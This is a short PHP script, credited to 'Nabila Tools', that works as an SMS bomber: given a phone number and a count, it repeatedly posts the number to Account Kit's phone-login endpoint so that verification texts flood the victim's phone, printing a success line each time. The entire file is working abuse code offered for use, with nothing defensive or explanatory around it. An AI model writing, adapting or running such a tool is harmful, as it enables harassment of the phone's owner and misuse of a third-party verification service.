<?php

/* 
tri.co.id Spam Sms
C0ded by : Muhammad Ikhsan f.t Achmad Rivaldi
Github  : https://github.com/thaniaanatasya
Admin Nabila Tools
*/
if(!$_GET['no']){ 
echo "Nabila Tools SMS accountkit.com";
}else{
$limit = $_GET['limit'];
$no = $_GET['no'];
            $header = array(
		    'POST /login/async/phone/start/?dpr=1 HTTP/1.1',
		    'Host: www.accountkit.com',
		    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0',
		    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		    'Accept-Language: en-US,en;q=0.5',
		    'Accept-Encoding: gzip, deflate, br',
		    'Content-Type: application/x-www-form-urlencoded',
		    'Referer: https://www.accountkit.com/login/',
		    'Content-Length: 221',
		    'Connection: keep-alive',);
    function http($postdata){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.accountkit.com/login/async/phone/start/?dpr=1');
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_VERBOSE, false);
        if(!empty($postdata)){
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
        }
        $response = curl_exec($ch);
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return array($http, $response);
    }
    for ($x = 3;$x <= $limit ;$x++) {
    http("credentials=%2B62".$no."&logging_ref=1Mscead6KsPNahCfV&__user=0&__a=1&__dyn=7xe6Fo4OQ1IKEK4osXWo5O12wAxu13wqovzE6u7E5G14wXx61rwf24o3Bw5VCK1awcG0KEswDwvEcE5u1Aw60Kfw&__req=20&__be=-1&__pc=PHASED%3ADEFAULT&__rev=4012203"); 
    sleep(30);
    flush();
    echo "Sms ke ".$no." Sukses<br>";
}
}

?>